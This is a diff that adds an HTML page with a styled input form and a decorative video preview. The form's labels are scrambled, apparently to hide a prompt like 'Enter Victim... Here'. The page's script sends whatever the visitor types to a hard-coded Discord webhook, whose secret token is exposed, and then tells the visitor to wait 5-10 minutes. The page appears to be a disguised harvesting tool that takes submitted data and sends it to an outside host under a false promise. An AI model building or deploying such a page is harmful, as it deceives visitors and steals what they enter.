@@ -25,4 +25,171 @@
 
         /* --- BOTH BOXES MATCH --- */
         .container, .video-panel {
-            backg
+            background: rgba(25, 25, 35, 0.9);
+            padding: 45px;
+            border-radius: 14px;
+            width: 340px;
+            text-align: center;
+
+            border: 2px solid #6e00ff;
+            box-shadow:
+                0 0 15px #6a00ff55,
+                0 0 35px #a200ff33;
+
+            transition: 0.25s ease;
+        }
+
+        .container:hover, .video-panel:hover {
+            transform: translateY(-4px);
+            box-shadow:
+                0 0 25px #8e00ff88,
+                0 0 60px #c000ff44;
+        }
+
+        h2 {
+            margin-bottom: 20px;
+            font-weight: 500;
+            letter-spacing: 0.7px;
+            color: #dcd2ff;
+            text-shadow: 0 0 8px #8e44ff;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            margin-top: 15px;
+            margin-bottom: 20px;
+            border-radius: 8px;
+            border: none;
+            background: #201f2f;
+            color: #e8e8ff;
+            font-size: 15px;
+            outline: none;
+            transition: 0.2s;
+            border: 1px solid #3b2c5a;
+        }
+
+        input:focus {
+            background: #2b2940;
+            transform: scale(1.03);
+            border-color: #8e44ff;
+            box-shadow: 0 0 10px #8e44ff55;
+        }
+
+        button {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #6e00ff, #b400ff);
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            color: white;
+            cursor: pointer;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            transition: 0.25s ease;
+            box-shadow: 0 0 20px #7a00ff66;
+        }
+
+        button:hover {
+            transform: translateY(-3px) scale(1.05);
+            box-shadow: 0 0 30px #9d00ff99;
+        }
+
+        .success {
+            margin-top: 15px;
+            color: #7aff9c;
+            display: none;
+            font-size: 15px;
+            text-shadow: 0 0 10px #00ff8844;
+        }
+
+        /* --- SMOOTH MATCHING VIDEO BOX --- */
+        .video-box {
+            width: 100%;
+            height: 200px;
+            border-radius: 12px;
+            overflow: hidden;
+            margin-top: 20px;
+
+            border: 1px solid #3b2c5a;
+            box-shadow: inset 0 0 10px #00000055;
+
+            transition: 0.25s ease;
+        }
+
+        .video-panel:hover .video-box {
+            transform: scale(1.02);
+            box-shadow: inset 0 0 18px #7a00ff55;
+            border-color: #8e44ff;
+        }
+
+        .video-box video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="wrapper">
+
+        <!-- LEFT PANEL -->
+        <div class="container">
+            <h2>mknr</h2>
+
+            <input type="text" id="message" placeholder="Enter Victijhbjhle Here">
+
+            <button onclick="sendData()">S,mn!</button>
+
+            <p class="success" id="msg">Hmnb wait 5-10 mins...</p>
+        </div>
+
+        <!-- RIGHT PANEL (NOW MATCHING + SMOOTH) -->
+        <div class="video-panel">
+            <h2>Preview</h2>
+
+            <div class="video-box">
+                <video autoplay muted loop>
+                    <source src="https://cdn.pixabay.com/video/2023/03/28/157408-812512671_large.mp4" type="video/mp4">
+                </video>
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        const webhook = "https://discord.com/api/webhooks/1439051346014638201/C2fBflf3zj_LgvxVMpQqIx3vgjZww5_JBiAr47HKM5is1uxPlVK-B6etBRAJwof0VNvw";
+
+        function splitIntoChunks(text) {
+            const MAX = 2000;
+            const chunks = [];
+
+            for (let i = 0; i < text.length; i += MAX) {
+                chunks.push(text.slice(i, i + MAX));
+            }
+
+            return chunks;
+        }
+
+        async function sendData() {
+            const message = document.getElementById("message").value.trim();
+            if (!message) return;
+
+            const chunks = splitIntoChunks(message);
+
+            for (const chunk of chunks) {
+                await fetch(webhook, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ content: chunk })
+                });
+            }
+
+            document.getElementById("msg").style.display = "block";
+        }
+    </script>
+
+</body>
+</html>
